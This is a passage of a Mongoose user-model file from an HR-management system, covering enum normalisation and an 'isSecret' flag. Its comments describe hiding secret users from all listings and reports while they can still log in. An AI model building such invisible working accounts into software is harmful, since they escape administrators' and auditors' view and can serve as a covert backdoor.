...
// models/UserModel.js - SHIFT TIMING SECTION UPDATE
  shiftTiming: {
    ...
    // Hidden/secret user — can log in but never appears in any user listing
    isSecret: {
      type: Boolean,
      default: false,
      select: false
...
userSchema.pre('save', function(next) {
  ...
  // Normalize enum fields to prevent ValidationError from old "" values
  const _validSalaryTypes = ['hourly', 'monthly', 'project', 'yearly', 'commission', 'fixed'];
  if (!this.salaryType || !_validSalaryTypes.includes(this.salaryType)) this.salaryType = 'monthly';
  const _validWorkLocations = ['onsite', 'remote', 'hybrid'];
  if (!this.workLocationType || !_validWorkLocations.includes(this.workLocationType)) this.workLocationType = 'onsite';
  const _validWorkArrangements = ['full-time', 'part-time', 'contractual', 'freelance', 'internship', 'temporary'];
  if (!this.workArrangement || !_validWorkArrangements.includes(this.workArrangement)) this.workArrangement = 'full-time';
  const _validStatuses = ['active', 'inactive', 'suspended'];
  if (!this.status || !_validStatuses.includes(this.status)) this.status = 'active';
...
// ============ HIDE SECRET USERS FROM ALL LISTINGS ============
// Any `User.find(...)` (list endpoints, reports, shift/department lists, etc.)
// automatically excludes secret users. Login uses findOne() and per-request
// auth uses findById(), which are NOT affected — so a secret user can still
// log in and use the system, they just never show up in any list.
// To intentionally include them, pass .setOptions({ includeSecret: true }).
...
// NOTE (merged project): the website/CMS keeps its own accounts in the `users`
// collection of the same database, so HRM users live in `hrm_users`.
// The model name stays "User" so every `ref: "User"` across the HRM models
// keeps working unchanged.
module.exports = mongoose.model("User", userSchema, "hrm_users");